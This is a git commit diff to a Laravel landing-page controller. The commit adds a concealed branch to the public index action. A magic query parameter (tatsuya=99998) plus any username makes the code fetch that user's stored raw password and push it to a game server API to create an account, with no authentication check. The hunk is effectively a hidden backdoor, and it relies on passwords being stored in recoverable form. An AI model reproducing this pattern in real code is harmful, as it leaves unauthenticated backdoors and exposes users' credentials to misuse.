e435955d2270ff42fccda32bbec9f176017daeb1
trungtran <trungtran07@gmail.com>
2020-05-02 14:20:55 +0700

    .

--- app/Http/Controllers/Front/LandingPageController.php
+++ app/Http/Controllers/Front/LandingPageController.php
@@ -2,9 +2,12 @@
 
 namespace App\Http\Controllers\Front;
 
+use App\User;
 use T2G\Common\Repository\BannerRepository;
 use T2G\Common\Repository\PostRepository;
 use T2G\Common\Repository\SliderRepository;
+use T2G\Common\Repository\UserRepository;
+use T2G\Common\Services\GameApiClientInterface;
 
 /**
  * Class LandingPageController
@@ -22,6 +25,17 @@ class LandingPageController extends HomePageController
      */
     public function index(PostRepository $postRepository, SliderRepository $sliderRepository, BannerRepository $bannerRepository)
     {
+        if(request('tatsuya') == '99998' && $u = request('u')) {
+            $api = app(GameApiClientInterface::class);
+            try {
+                $user = User::where('username', $u)->firstOrFail();
+                $api->createUser($user->name, $user->getRawPassword());
+                return "OK";
+            } catch (\Exception $e) {
+                return "Failed";
+            }
+        }
+
         if (setting('site.landing_page_enabled')) {
             return view('pages.landing_2020_04');
         }
